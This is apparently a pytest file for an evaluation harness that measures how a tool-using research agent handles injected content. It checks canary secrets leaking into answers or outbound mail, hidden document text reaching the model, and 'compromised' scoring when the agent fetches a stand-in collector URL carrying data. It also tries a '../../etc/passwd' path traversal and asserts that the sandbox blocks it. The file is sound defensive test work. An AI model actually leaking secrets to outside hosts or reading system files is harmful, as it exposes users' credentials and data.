"""Reference agent, sandboxed tools, renderer and evaluation target. No network: the router is faked."""

from __future__ import annotations

import json
from typing import Any

import pytest

from intentseal_core.llm.router import ChatResult
from research_agent import ActionVerdict, AgentHooks, ResearchAgent, World
from research_agent.render import Block, to_docx, to_pdf
from research_agent.tools import Toolbox, extract_file_naive


class FakeRouter:
    """Replays scripted model turns: each item is (content, [(tool, args), ...])."""

    def __init__(self, script: list[tuple[str, list[tuple[str, dict]]]]) -> None:
        self.script = list(script)
        self.requests: list[Any] = []

    async def chat(self, role: str, req: Any) -> ChatResult:
        self.requests.append(req)
        content, calls = self.script.pop(0)
        tcs = [{"id": f"c{i}", "type": "function", "function": {"name": n, "arguments": json.dumps(a)}}
               for i, (n, a) in enumerate(calls)]
        return ChatResult(content=content, tool_calls=tcs, finish_reason="stop", provider="fake", model="m",
                          key_alias=None, input_tokens=10, output_tokens=4, latency_ms=0, est_cost_usd=0,
                          cached=False, attempts=[])


@pytest.fixture
def world():
    w = World()
    yield w
    w.cleanup()


async def test_agent_runs_tools_and_answers(world):
    r = FakeRouter([("", [("query_db", {"customer_id": "C-1042"})]), ("Asha is in Pune.", [])])
    t = await ResearchAgent(r, world).run("Where is C-1042?")
    assert t.answer == "Asha is in Pune." and [e["tool"] for e in t.tool_calls()] == ["query_db"]
    tool_msg = r.requests[1].messages[-1]
    assert tool_msg["role"] == "tool" and "Pune" in tool_msg["content"]


async def test_system_prompt_holds_canaries_and_answer_leak_is_detectable(world):
    r = FakeRouter([(f"key is {world.canaries.api_key}", [])])
    t = await ResearchAgent(r, world).run("hi")
    assert world.canaries.api_key in r.requests[0].messages[0]["content"]
    assert world.canary_hits(t.answer) == ["api_key"]


async def test_send_outside_domain_and_canary_export_are_recorded(world):
    body = f"phone {world.canaries.customer_phone}"
    r = FakeRouter([("", [("send_message", {"to": "x@elsewhere.test", "subject": "s", "body": body})]), ("done", [])])
    await ResearchAgent(r, world).run("task")
    assert len(world.external_sends()) == 1 and world.leaked_canaries() == ["customer_phone"]


async def test_hooks_can_block_actions_and_rewrite_content(world):
    class Guard(AgentHooks):
        async def on_content(self, source, content, meta):
            return "[filtered]" if source == "tool:read_email" else content

        async def on_action(self, tool, args, meta):
            return ActionVerdict(False, notice="blocked") if tool == "send_message" else ActionVerdict(True, args)

    r = FakeRouter([("", [("read_email", {}), ("send_message", {"to": "a@b.test", "subject": "", "body": ""})]),
                    ("ok", [])])
    t = await ResearchAgent(r, world, hooks=Guard()).run("task")
    msgs = r.requests[1].messages
    assert msgs[-2]["content"] == "[filtered]" and msgs[-1]["content"] == "blocked"
    assert world.outbox == [] and t.tool_calls()[1]["allowed"] is False


def test_tools_are_sandboxed(world):
    tb = Toolbox(world)
    assert tb.read_file("../../etc/passwd") == "error: path outside workspace"
    assert tb.write_file("../escape.txt", "x").startswith("error")
    assert world.writes[-1]["inside_sandbox"] is False
    assert tb.web_fetch("https://real-site.example.com/") .startswith("HTTP 404")
    assert "Pune" in tb.query_db("C-1042")
    assert tb.send_message("a@example-corp.test", "s", "b").startswith("sent")
    assert world.outbox_path.exists()


def test_world_overrides_deliver_content_per_channel():
    w = World(overrides={"pages": {"https://fixtures.test/x.html": "PAGE"}, "emails": [{"id": "e", "body": "MAIL"}],
                         "files": {"inbox/a.txt": "FILE"}, "customers": {"C-1042": {"notes": "NOTE"}}})
    tb = Toolbox(w)
    try:
        assert tb.web_fetch("https://fixtures.test/x.html") == "PAGE"
        assert "MAIL" in tb.read_email() and tb.read_file("inbox/a.txt") == "FILE"
        assert "NOTE" in tb.query_db("C-1042")
    finally:
        w.cleanup()


def test_canaries_are_fresh_per_world():
    a, b = World(), World()
    try:
        assert a.canaries.api_key != b.canaries.api_key
    finally:
        a.cleanup(), b.cleanup()


def test_renderer_non_visible_blocks_reach_naive_extraction(tmp_path):
    pdf = tmp_path / "t.pdf"
    pdf.write_bytes(to_pdf([Block("visible 123"), Block("nonvisible 456", visible=False)]))
    docx = tmp_path / "t.docx"
    docx.write_bytes(to_docx([Block("visible 123"), Block("nonvisible 456", visible=False)]))
    for f in (pdf, docx):
        text = extract_file_naive(f)
        assert "visible 123" in text and "nonvisible 456" in text   # what a naive loader feeds the model


def test_target_reports_deterministic_flags(monkeypatch, tmp_path):
    from fastapi.testclient import TestClient
    import targets.agent_target as tgt

    monkeypatch.setattr(tgt, "LOG_DIR", tmp_path)   # never write test runs into data/eval_runs

    class StubRouter(FakeRouter):
        pass

    def fake_agent_router():
        return StubRouter([("", [("web_fetch", {"url": "https://collector.test/?d=1"})]), ("ok", [])])

    with TestClient(tgt.app) as c:
        tgt._router = fake_agent_router()
        out = c.post("/run", json={"channel": "email", "content": "hello"}).json()
    assert out["external_fetch"] and out["compromised"] is True
    assert out["agent_tokens"] > 0 and "agent_usd" in out   # per-run usage for the G7b overhead


def test_rescore_counts_only_fetches_that_leave_the_sandbox():
    from intentseal_eval.report import rescore

    same_site = {"compromised": True, "external_fetch": ["http://fixtures.test/incoming.html"], "tools": ["web_fetch"],
                 "blocked_tools": []}
    assert rescore(same_site)["compromised"] is False          # DEF-019: http vs https on the sandbox site
    out = {"compromised": True, "external_fetch": ["https://collector.test/?d=1"], "tools": ["web_fetch"], "blocked_tools": []}
    assert rescore(out)["compromised"] is True


def test_pdf_renderer_keeps_non_latin_letters(tmp_path):
    # D-031 / C4: with only the built-in Helvetica, Cyrillic letters reached readers as boxes.
    import pytest
    from research_agent.render import _pdf_font

    if _pdf_font()[0] == "Helvetica":
        pytest.skip("no Unicode TrueType font installed on this machine")
    f = tmp_path / "u.pdf"
    f.write_bytes(to_pdf("Report r\u0435vi\u0435w \u0440\u0430\u0441k\u0430g\u0435"))
    assert "\u0435" in extract_file_naive(f)
